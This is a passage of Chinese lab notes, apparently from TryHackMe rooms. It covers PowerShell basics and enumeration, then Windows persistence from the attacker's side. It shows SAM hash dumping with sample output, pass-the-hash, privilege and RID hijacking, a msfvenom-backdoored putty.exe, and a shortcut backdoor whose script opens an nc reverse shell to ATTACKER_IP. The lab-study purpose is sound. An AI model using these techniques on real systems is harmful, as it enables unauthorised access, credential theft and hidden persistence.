Command-Name</code></p><p>您还可以通过传入<code>-examples</code>选项来了解如何准确使用该命令。</p><hr><p><code>Get-Command</code></p><p>获取当前计算机上安装的所有cmdlet 。此cmdlet的优点 在于它允许进行模式匹配</p><p>如：<code>Get-Command Verb-*</code>或者<code>Get-Command *-Noun</code></p><hr><p>对象操作：</p><p><em>每个cmdlet</em>的输出 都是一个对象。如果我们想要操作输出，我们需要弄清楚以下几点：</p><ul><li>将输出传递给其他<em>cmdlet</em></li><li>使用特定对象<em>cmdlet</em> 来提取信息</li></ul><p>Pipeline( <code>|</code>) 用于将输出从一个<em>cmdlet</em>传递 到另一个。与其他 shell 相比，一个主要区别是 Powershell 将对象传递给下一个<em>cmdlet</em>，而不是将文本或字符串传递给管道后的命令。与面向对象框架中的每个对象一样，对象将包含方法和属性。</p><p>您可以将方法视为可应用于 cmdlet 输出的函数*，* 并将属性视为<em>cmdlet输出中的变量。要查看这些详细信息，请将**cmdlet</em>的输出传递 给<code>Get-Member</code> <em>cmdlet：</em></p><p>如：<code>Get-Command | Get-Member -MemberType Method</code></p><p><em>从以前的cmdlet</em>创建对象</p><p><em>操作对象的一种方法是从cmdlet</em>的输出中提取属性并创建新对象。这是使用<code>Select-Object</code> <em>cmdlet 完成的</em></p><p>以下是列出目录并通过模式和名称进行过滤<code>Get-ChildItem | Select-Object -Property</code></p><p><strong>过滤对象</strong></p><p>检索输出对象时，您可能希望选择与特定值匹配的对象。您可以使用<code>Where-Object</code>基于属性值的过滤器来执行此操作。</p><p><em>使用此cmdlet 的</em>一般格式 为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Verb-Noun | Where-Object -Property PropertyName -operator Value</span><br><span class="line">Verb-Noun | Where-Object &#123;$_.PropertyName -operator Value&#125;</span><br></pre></td></tr></table></figure><p>第二个版本使用<code>$_</code>运算符来遍历传递给<code>Where-Object</code> <em>cmdlet</em>的每个对象。</p><blockquote><p><strong>Powershell 非常敏感，所以不要在命令周围加上引号！</strong></p></blockquote><p><code>-operator</code>以下运算符的列表在哪里：</p><ul><li><code>-Contains</code>：如果属性值中的任何项与指定值完全匹配</li><li><code>-EQ</code>：如果属性值与指定值相同</li><li><code>-GT</code>：如果属性值大于指定值</li></ul><p>检查已停止进程的示例：<code>Get-Service | Where-Object -Property Status -eq Stopped</code></p><p><strong>排序对象</strong></p><p>当<em>cmdlet</em>输出大量信息时，您可能需要对其进行排序，以便更有效地提取信息。您可以通过将 cmdlet 的输出通过管道传输<em>到</em> cmdlet 来<code>Sort-Object</code> <em>实现</em>这一点。</p><p>该命令的格式为：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Verb<span class="literal">-Noun</span> | <span class="built_in">Sort-Object</span></span><br></pre></td></tr></table></figure><p>对目录列表进行排序：<code>Get-ChildItem | Sort-Object</code></p><p>例子：</p><p>1、搜索文件“interesting-file.txt”的位置</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ChildItem</span> “*interesting<span class="operator">-file</span>*” <span class="literal">-Path</span> C:\ <span class="literal">-Recurse</span> <span class="literal">-ErrorAction</span> SilentlyContinue</span><br></pre></td></tr></table></figure><p>2、查看文件内容</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ChildItem</span> “*interesting<span class="operator">-file</span>*” <span class="literal">-Path</span> C:\ <span class="literal">-Recurse</span> <span class="literal">-ErrorAction</span> SilentlyContinue | <span class="built_in">Get-Content</span></span><br></pre></td></tr></table></figure><p>3、系统上安装了多少个 cmdlet（仅 cmdlet，不包括函数和别名）</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">Get-Command</span> | <span class="built_in">Where-Object</span> &#123;<span class="variable">$_</span>.CommandType <span class="operator">-eq</span> “Cmdlet”&#125;).Count</span><br></pre></td></tr></table></figure><p>4、获取 interesting-file.txt 的 MD5 哈希值</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ChildItem</span> “*interesting<span class="operator">-file</span>*” <span class="literal">-Path</span> C:\ <span class="literal">-Recurse</span> <span class="literal">-ErrorAction</span> SilentlyContinue | <span class="built_in">Get-FileHash</span> <span class="literal">-Algorithm</span> MD5</span><br></pre></td></tr></table></figure><p>5、获取当前工作目录</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-Location</span></span><br></pre></td></tr></table></figure><hr><p><strong>信息收集</strong></p><p>1、枚举机器上用户数量</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">Get-LocalUser</span>).Name.Count</span><br></pre></td></tr></table></figure><p>2、查看当前系统中所有用户的SID</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic useraccount get name,sid</span><br></pre></td></tr></table></figure><p>3、此 SID(S-1-5-21-1394777289-3961777894-1791813945-501) 属于哪个本地用户</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">Get-LocalUser</span> | <span class="built_in">Select-Object</span> * | <span class="built_in">Where-Object</span> &#123;<span class="variable">$_</span>.SID <span class="operator">-eq</span> “S<span class="literal">-1</span>–<span class="number">5</span>–<span class="number">21</span>–<span class="number">1394777289</span>–<span class="number">3961777894</span>–<span class="number">1791813945</span>–<span class="number">501</span>”&#125;).Name</span><br></pre></td></tr></table></figure><p>4、有多少用户的密码要求值设置为 False</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">Get-LocalUser</span> | <span class="built_in">Select-Object</span> * | <span class="built_in">Where-Object</span> &#123;<span class="variable">$_</span>.PasswordRequired <span class="operator">-eq</span> “<span class="variable">$Fales</span>”&#125;).Count</span><br></pre></td></tr></table></figure><p>5、有多少Local group</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">Get-LocalGroup</span>).Name.Count</span><br></pre></td></tr></table></figure><p>6、获取 IP 地址信息</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-NetIPAddress</span></span><br></pre></td></tr></table></figure><p>7、有多少个端口被列为正在监听</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">Get-NetTCPConnection</span> | <span class="built_in">Where-Object</span> &#123;<span class="variable">$_</span>.State <span class="operator">-eq</span> “Listen”&#125;).Count</span><br></pre></td></tr></table></figure><p>8、监听端口 445 的本地端口的远程地址是什么</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-NetTCPConnection</span> | <span class="built_in">Where-Object</span> &#123;(<span class="variable">$_</span>.State <span class="operator">-eq</span> “Listen”) <span class="operator">-and</span> (<span class="variable">$_</span>.LocalPort <span class="operator">-eq</span> “<span class="number">445</span>”)&#125;</span><br></pre></td></tr></table></figure><p>9、已应用了多少个补丁</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">Get-HotFix</span>).Count</span><br></pre></td></tr></table></figure><p>10、ID 为 KB4023834 的补丁是何时安装的</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-HotFix</span> | <span class="built_in">Where-Object</span> &#123;<span class="variable">$_</span>.HotFixID <span class="operator">-eq</span> “KB4023834”&#125; | <span class="built_in">Select-Object</span> * | <span class="built_in">Select-Object</span> InstalledOn</span><br></pre></td></tr></table></figure><p>11、查找备份文件的内容</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ChildItem</span> “*.bak*” <span class="literal">-Path</span> C:\ <span class="literal">-Recurse</span> <span class="literal">-ErrorAction</span> SilentlyContinue | <span class="built_in">Get-Content</span></span><br></pre></td></tr></table></figure><p>12、搜索所有包含 API_KEY 的文件</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ChildItem</span> <span class="literal">-Path</span> C:\Users <span class="literal">-Recurse</span> <span class="literal">-ErrorAction</span> SilentlyContinue | <span class="built_in">Select-String</span> “API_KEY”</span><br></pre></td></tr></table></figure><p>13、列出所有正在运行的进程</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-Process</span></span><br></pre></td></tr></table></figure><p>14、名为new-sched-task的计划任务的路径是什么</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">Get-ScheduledTask</span> | <span class="built_in">Where-Object</span> &#123;<span class="variable">$_</span>.TaskName <span class="operator">-eq</span> “<span class="built_in">new-sched</span><span class="literal">-task</span>”&#125;).TaskPath</span><br></pre></td></tr></table></figure><p>15、C:\ 的所有者是谁</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">Get-Acl</span> <span class="literal">-Path</span> “C:\”).Owner</span><br></pre></td></tr></table></figure><hr><p><strong>Powershell脚本</strong></p><p>Powershell ISE（Powershell 文本编辑器），Powershell 脚本通常具有***.ps1*** 文件扩展名</p><p><a href="https://learnxinyminutes.com/docs/powershell/">powershell脚本语法</a></p><hr><h4 id="windows-权限维持">Windows 权限维持</h4><blockquote><p>远程连接Windows PS终端</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.90.142 -u Administrator -p Password321</span><br></pre></td></tr></table></figure><p>GUI连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xfreerdp /u:Administrator /p:Password321 /v:10.10.90.142</span><br></pre></td></tr></table></figure></blockquote><p>在内网取得立足点后，建立持久性是我们作为攻击者在获得网络访问权限时要完成的首要任务之一。持久性是指创建替代方法来重新获得对主机的访问权限，而无需重新经历利用阶段。</p><p>原因：重新利用并不总是可行的（不稳定的漏洞）</p><p>​  获得访问权难以重现（网络钓鱼）</p><p>​  避免被蓝队发现</p><ul><li><strong>篡改非特权账户</strong></li></ul><p>拥有管理员凭证是实现机器持久性的最简单方法。但是，为了让蓝队更难发现我们，我们可以操纵非特权用户（这些用户通常不会像管理员那样受到监控），并以某种方式授予他们管理权限。</p><p><strong>分配群组成员资格</strong></p><p>假设您已经转储了受害机器的密码哈希，并成功破解了正在使用的非特权帐户的密码。</p><p>让非特权用户获得管理权限的直接方法是使其成为<strong>管理员</strong>组的一部分。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators thmuser0 /add</span><br></pre></td></tr></table></figure><p>这将允许您使用RDP、WinRM 或任何其他可用的远程管理服务访问服务器。</p><p>如果这看起来太可疑，您可以使用<strong>Backup Operators</strong>组。此组中的用户没有管理权限，但可以读取/写入系统上的任何文件或注册表项，忽略任何配置的DACL。这将允许我们复制 SAM 和 SYSTEM 注册表配置单元的内容，然后我们可以使用它来恢复所有用户的密码哈希，从而使我们能够轻松升级到任何管理帐户。</p><p>为此，我们首先将帐户添加到备份操作员组：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup &quot;Backup Operators&quot; thmuser1 /add</span><br></pre></td></tr></table></figure><p>由于这是一个非特权帐户，因此除非我们将其添加到<strong>远程桌面用户</strong>( RDP ) 或<strong>远程管理用户( WinRM ) 组，否则它无法通过</strong>RDP或 WinRM 返回计算机。我们将使用 WinRM 执行此任务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup &quot;Remote Management Users&quot; thmuser1 /add</span><br></pre></td></tr></table></figure><p>此时有可能发现即使您属于 Backups Operators 组，您也无法按预期访问所有文件，快速检查我们分配的组会发现我们是 Backup Operators 的一部分，但该组已被禁用</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\thmuser1\Documents&gt; whoami /groups</span><br><span class="line"></span><br><span class="line"><span class="built_in">GROUP</span> INFORMATION</span><br><span class="line"><span class="literal">-----------------</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Group</span> Name                             <span class="built_in">Type</span>             SID          Attributes</span><br><span class="line">====================================== ================ ============ ==================================================</span><br><span class="line">Everyone                               Well<span class="literal">-known</span> <span class="built_in">group</span> S<span class="literal">-1-1-0</span>      Mandatory <span class="built_in">group</span>, Enabled by default, Enabled <span class="built_in">group</span></span><br><span class="line">BUILTIN\Users                          Alias            S<span class="literal">-1-5-32-545</span> Mandatory <span class="built_in">group</span>, Enabled by default, Enabled <span class="built_in">group</span></span><br><span class="line">BUILTIN\Backup Operators               Alias            S<span class="literal">-1-5-32-551</span> <span class="built_in">Group</span> used <span class="keyword">for</span> deny only</span><br><span class="line">BUILTIN\Remote Management Users        Alias            S<span class="literal">-1-5-32-580</span> Mandatory <span class="built_in">group</span>, Enabled by default, Enabled <span class="built_in">group</span></span><br><span class="line">NT AUTHORITY\NETWORK                   Well<span class="literal">-known</span> <span class="built_in">group</span> S<span class="literal">-1-5-2</span>      Mandatory <span class="built_in">group</span>, Enabled by default, Enabled <span class="built_in">group</span></span><br><span class="line">NT AUTHORITY\Authenticated Users       Well<span class="literal">-known</span> <span class="built_in">group</span> S<span class="literal">-1-5-11</span>     Mandatory <span class="built_in">group</span>, Enabled by default, Enabled <span class="built_in">group</span></span><br><span class="line">NT AUTHORITY\This Organization         Well<span class="literal">-known</span> <span class="built_in">group</span> S<span class="literal">-1-5-15</span>     Mandatory <span class="built_in">group</span>, Enabled by default, Enabled <span class="built_in">group</span></span><br><span class="line">NT AUTHORITY\Local account             Well<span class="literal">-known</span> <span class="built_in">group</span> S<span class="literal">-1-5-113</span>    Mandatory <span class="built_in">group</span>, Enabled by default, Enabled <span class="built_in">group</span></span><br><span class="line">NT AUTHORITY\NTLM Authentication       Well<span class="literal">-known</span> <span class="built_in">group</span> S<span class="literal">-1-5-64-10</span>  Mandatory <span class="built_in">group</span>, Enabled by default, Enabled <span class="built_in">group</span></span><br><span class="line">Mandatory Label\Medium Mandatory Level Label            S<span class="literal">-1-16-8192</span></span><br></pre></td></tr></table></figure><p>这是由于用户帐户控制 ( UAC ) 造成<strong>的。UAC 实现的功能之一 LocalAccountTokenFilterPolicy</strong>会在远程 登录时剥夺任何本地帐户的管理权限</p><p>为了能够重新获得用户的管理权限，我们必须通过将以下注册表项更改为 1 来禁用 LocalAccountTokenFilterPolicy</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d <span class="number">1</span></span><br></pre></td></tr></table></figure><p>接下来再次登录发现可以正常行使权限，按照在提权部分提过的备份 SAM 和 SYSTEM的方式，转储所有用户的密码哈希</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\thmuser1\Documents&gt; reg save hklm\system system.bak</span><br><span class="line">The operation completed successfully.</span><br><span class="line"></span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\thmuser1\Documents&gt; reg save hklm\sam sam.bak</span><br><span class="line">The operation completed successfully.</span><br><span class="line"></span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\thmuser1\Documents&gt; download system.bak</span><br><span class="line"></span><br><span class="line">Info: Downloading C:\Users\thmuser1\Documents\system.bak to system.bak</span><br><span class="line"></span><br><span class="line">Info: Download successful!</span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\thmuser1\Documents&gt; download sam.bak</span><br><span class="line"></span><br><span class="line">Info: Downloading C:\Users\thmuser1\Documents\sam.bak to sam.bak</span><br><span class="line"></span><br><span class="line">Info: Download successful!</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">┌──(orac1e㉿LAPTOP-BNS9VG4K)-[~/THM]</span><br><span class="line">└─$ python3 ../impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL</span><br><span class="line">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class="line"></span><br><span class="line">[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821</span><br><span class="line">[*] Dumping <span class="built_in">local</span> SAM hashes (uid:rid:lmhash:nthash)</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::</span><br><span class="line">thmuser1:1008:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::</span><br><span class="line">thmuser2:1009:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::</span><br><span class="line">thmuser3:1010:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::</span><br><span class="line">thmuser0:1011:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::</span><br><span class="line">thmuser4:1013:aad3b435b51404eeaad3b435b51404ee:8767940d669d0eb618c15c11952472e5:::</span><br><span class="line">[-] NTDSHashes.__init__() got an unexpected keyword argument <span class="string">&#x27;skipUser&#x27;</span></span><br><span class="line">[*] Cleaning up...</span><br></pre></td></tr></table></figure><p>传递哈希函数以管理员权限连接到受害机器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.90.142 -u Administrator -H f3118544a831e728781d780cfdb9c1fa</span><br></pre></td></tr></table></figure><p><strong>特殊权限和安全描述符</strong></p><p>无需修改任何组成员身份即可实现与将用户添加到备份操作员组类似的结果。特殊组之所以特殊，是因为操作系统默认为它们分配了特定权限。<strong>权限</strong>只是在系统本身上执行任务的能力。它们包括简单的事情，例如具有关闭服务器的能力，以及非常特权的操作，例如能够拥有系统上任何文件的所有权。可以<a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants">在此处</a>找到可用权限的完整列表以供参考。</p><p>对于备份操作员组，其默认分配有以下两个权限：</p><ul><li>**SeBackupPrivilege：**用户可以读取系统中的任何文件，忽略任何现有的DACL 。</li><li>**SeRestorePrivilege：**用户可以写入系统中的任何文件，忽略任何现有的DACL 。</li></ul><p>我们可以将此类权限分配给任何用户，而不管其组成员身份如何。为此，我们可以使用该<code>secedit</code>命令。首先，我们将当前配置导出到临时文件：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secedit /export /cfg config.inf</span><br></pre></td></tr></table></figure><p>我们打开文件并将我们的用户添加到有关 SeBackupPrivilege 和 SeRestorePrivilege 的配置行中</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/765671a0355e2260c44e5a12a10f090e.png" alt="config.inf 内容"></p><p>我们最终将.inf 文件转换为.sdb 文件，然后使用该文件将配置加载回系统：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">secedit /import /cfg config.inf /db config.sdb</span><br><span class="line"></span><br><span class="line">secedit /configure /db config.sdb /cfg config.inf</span><br></pre></td></tr></table></figure><p>现在，您应该拥有一个与任何备份操作员具有同等权限的用户。该用户仍然无法通过 WinRM 登录系统，因此让我们采取一些措施。我们不会将用户添加到远程管理用户组，而是更改与 WinRM 服务关联的安全描述符以允许 thmuser2 连接。将安全<strong>描述</strong>符视为应用于其他系统设施的ACL 。</p><p>要打开 WinRM 安全描述符的配置窗口，您可以在 Powershell 中使用以下命令（您需要为此使用GUI会话）：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-PSSessionConfiguration</span> <span class="literal">-Name</span> Microsoft.PowerShell <span class="literal">-showSecurityDescriptorUI</span></span><br></pre></td></tr></table></figure><p>这将打开一个窗口，您可以在其中添加 thmuser2 并为其分配连接到 WinRM 的全部权限：</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/380c80b98c4d1f8c2149ef72427cfeb0.png" alt="WinRM 安全描述符"></p><p>完成此操作后，我们的用户可以通过 WinRM 连接。由于用户具有 SeBackup 和 SeRestore 权限，我们可以重复这些步骤从 SAM 恢复密码哈希并重新连接到管理员用户。</p><blockquote><p>注意，要使该用户充分使用给定的权限，您必须更改<strong>LocalAccountTokenFilterPolicy</strong>注册表项，像上一节中一样</p></blockquote><p>如果你检查用户的组成员身份，你会发现它看起来像一个普通用户。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; net user thmuser2</span><br><span class="line">User name                    thmuser2</span><br><span class="line"></span><br><span class="line">Local Group Memberships      *Users</span><br><span class="line">Global Group memberships     *None</span><br></pre></td></tr></table></figure><p><strong>RID劫持</strong></p><p>无需成为管理员即可获得管理权限的另一种方法是更改某些注册表值，以使操作系统认为您是管理员。</p><p>创建用户时，会为其分配一个称为**相对 ID (RID)**的标识符。RID 只是一个代表整个系统中用户的数字标识符。当用户登录时，LSASS 进程从 SAM 注册表配置单元获取其 RID，并创建与该 RID 关联的访问令牌。如果我们可以篡改注册表值，我们就可以让 Windows 通过将相同的 RID 关联到两个帐户来为非特权用户分配管理员访问令牌。</p><p>在任何 Windows 系统中，默认管理员帐户都被分配了<strong>RID = 500</strong>，而普通用户的<strong>RID 通常为 &gt;= 1000</strong>。</p><p>要查找任何用户的分配的 RID，可以使用以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic useraccount get name,sid</span><br></pre></td></tr></table></figure><p>RID 是 SID 的最后一位（1010 表示 thmuser3，500 表示管理员）。SID 是一个标识符，它允许操作系统跨域识别用户，但此时，我们不会太在意其余部分。</p><p>现在我们只需将 RID=500 分配给 thmuser3。为此，我们需要使用 Regedit 访问 SAM。SAM 仅限于 SYSTEM 帐户，因此即使是管理员也无法编辑它。要以 SYSTEM 身份运行 Regedit，我们将使用<code>psexec</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\tools\pstools&gt; .\PsExec.exe -i -s regedit</span><br></pre></td></tr></table></figure><p>从 Regedit 中，我们将转到<code>HKLM\SAM\SAM\Domains\Account\Users\</code>计算机中每个用户对应的键。由于我们想要修改 thmuser3，因此我们需要搜索一个键，其 RID 为十六进制 (1010 = 0x3F2)。在相应的键下，将有一个名为<strong>F</strong>的值，它在位置 0x30 处保存用户的有效 RID：</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/d630140974989748ebcf150ba0696d14.png" alt="RID 劫持 1"></p><p>请注意，RID 采用小端表示法存储，因此其字节显示为反转。</p><p>现在，我们将用十六进制的管理员 RID（500 = 0x01F4）替换这两个字节，并交换字节（F401）：</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/8f2072b6d13b7343cf7b890586703ddf.png" alt="RID劫持2"></p><p>thmuser3 下次登录时，LSASS 会将其与管理员相同的 RID 关联，并授予其相同的权限。</p><h4 id="后门文件">后门文件</h4><p>建立持久性的另一种方法是篡改我们知道用户经常与之交互的一些文件。通过对这些文件进行一些修改，我们可以植入后门，只要用户访问这些文件，后门就会执行。</p><ul><li><strong>可执行文件</strong></li></ul><p>如果您在桌面上发现任何可执行文件，则用户很可能会经常使用它。假设我们找到了一个 PuTTY 的快捷方式。如果我们检查快捷方式的属性，我们可以看到它（通常）指向<code>C:\Program Files\PuTTY\putty.exe</code>。从那一刻起，我们可以将可执行文件下载到攻击者的机器上并对其进行修改以运行我们想要的任何有效载荷。</p><p>你可以使用 轻松地在任何 .exe 文件中植入你喜欢的有效载荷<code>msfvenom</code>。二进制文件仍将照常工作，但通过在二进制文件中添加额外线程，可以静默执行其他有效载荷。要创建后门 putty.exe，我们可以使用以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b &quot;\x00&quot; -f exe -o puttyX.exe</span><br></pre></td></tr></table></figure><p>生成的 puttyX.exe 将在用户不知情的情况下执行 reverse_tcp meterpreter 有效负载。虽然这种方法足以建立持久性，但让我们看看其他更隐蔽的技术。</p><ul><li><strong>快捷方式文件</strong></li></ul><p>如果我们不想改变可执行文件，我们总是可以篡改快捷方式文件本身。我们可以将其改为指向一个脚本，该脚本将运行后门，然后正常执行常规程序，而不是直接指向预期的可执行文件。</p><p>例子：</p><p>检查管理员桌面上的<strong>calc快捷方式。如果我们右键单击它并转到属性，我们将看到它指向的位置：</strong></p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/7a7349b9dcc5af3180044ee1d7605967.png" alt="计算属性"></p><p>在劫持快捷方式的目标之前，让我们在<code>C:\Windows\System32</code>或任何其他隐蔽位置创建一个简单的 Powershell 脚本。该脚本将执行反向 shell，然后从快捷方式属性上的原始位置运行 calc.exe：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Start-Process</span> <span class="literal">-NoNewWindow</span> <span class="string">&quot;c:\tools\nc64.exe&quot;</span> <span class="string">&quot;-e cmd.exe ATTACKER_IP 4445&quot;</span></span><br><span class="line"></span><br><span class="line">C:\Windows\System32\calc.exe</span><br></pre></td></tr></table></figure><p>最后，我们将更改快捷方式以指向我们的脚本。请注意，执行此操作时快捷方式的图标可能会自动调整。确保将图标指向原始可执行文件，以便用户看不到任何可见的更改。我们还想在隐藏窗口上运行我们的脚本，为此我们将向Powershell 添加选项<code>-windowstyle hidden</code>。快捷方式的最终目标是：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe <span class="literal">-WindowStyle</span> <span class="keyword">hidden</span> C:\Windows\System32\backdoor.ps1</span><br></pre></td></tr></table></figure><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/fe703ddea6135e0c867afcc6f61a8cd2.png" alt="带有后门的 lnk 文件"></p><p>启动一个 nc 监听器来在攻击机上接收反向 shell：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 